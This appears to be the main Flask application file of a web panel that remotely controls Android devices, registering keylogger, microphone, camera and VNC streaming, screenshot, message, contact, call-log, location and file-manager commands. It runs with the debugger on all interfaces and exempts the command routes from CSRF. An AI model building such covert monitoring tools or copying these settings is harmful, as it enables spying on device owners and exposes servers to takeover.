import sys
import os

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, PROJECT_ROOT)

from models.users import User
from flask import Flask, render_template, session, redirect, url_for, request, jsonify
from dotenv import load_dotenv
from flask_wtf.csrf import CSRFProtect, CSRFError
from datetime import timedelta
from user.routes import auth, dashboard, devices, profile, provisioning
from user.routes.commands import location, call_details, contacts, device_info, messages, apps, file_manager, keylogger, stream_camera, stream_vnc, screenshot, microphone, command_center, policies
from user.routes.notifications import notifications_bp
import os
from config.database import init_app, db
from utils.filters import init_filters
from utils.caching import init_cache

load_dotenv()

app = Flask(__name__, static_folder="../static")
app.secret_key = os.getenv("SECRET_KEY")
app.config['WTF_CSRF_ENABLED'] = True  # Enable CSRF protection
app.config['WTF_CSRF_TIME_LIMIT'] = None  # No time limit for CSRF tokens
app.config['CACHE_TYPE'] = 'SimpleCache'
app.config['CACHE_DEFAULT_TIMEOUT'] = 600
app.permanent_session_lifetime = timedelta(hours=12)  # Set session timeout to 12 hours
csrf = CSRFProtect(app)

init_app(app)
init_cache(app)
init_filters(app)

@app.errorhandler(404)
def page_not_found(e):
    return render_template('errors/404.html'), 404


@app.errorhandler(500)
def internal_server_error():
    return render_template('errors/500.html'), 500


@app.errorhandler(CSRFError)
def handle_csrf_error(e):
    return render_template('errors/400.html'), 400


@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard.index'))
    return redirect(url_for('auth.login'))


app.register_blueprint(auth.auth)
app.register_blueprint(dashboard.dashboard)
app.register_blueprint(devices.devices)
app.register_blueprint(profile.profile)
app.register_blueprint(provisioning.provisioning)

# Command blueprints
app.register_blueprint(location.location_command)
app.register_blueprint(call_details.call_details_command)
app.register_blueprint(contacts.contacts_command)
app.register_blueprint(device_info.device_info_command)
app.register_blueprint(messages.messages_command)
app.register_blueprint(apps.apps_command)
app.register_blueprint(file_manager.file_manager_command)
app.register_blueprint(keylogger.keylogger_command)
app.register_blueprint(stream_camera.stream_camera_bp)
app.register_blueprint(stream_vnc.stream_vnc_bp)
app.register_blueprint(screenshot.screenshot_command)
app.register_blueprint(microphone.microphone_command)
app.register_blueprint(command_center.command_center_command)
app.register_blueprint(policies.policies_command)
app.register_blueprint(notifications_bp)

# Exempt command proxy blueprints from CSRF — these POST to Android devices,
# not user-facing forms, so CSRF tokens aren't available.
csrf.exempt(keylogger.keylogger_command)
csrf.exempt(microphone.microphone_command)
csrf.exempt(screenshot.screenshot_command)
csrf.exempt(stream_camera.stream_camera_bp)
csrf.exempt(stream_vnc.stream_vnc_bp)
csrf.exempt(command_center.command_center_command)
csrf.exempt(file_manager.file_manager_command)

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(debug=True, host="0.0.0.0")
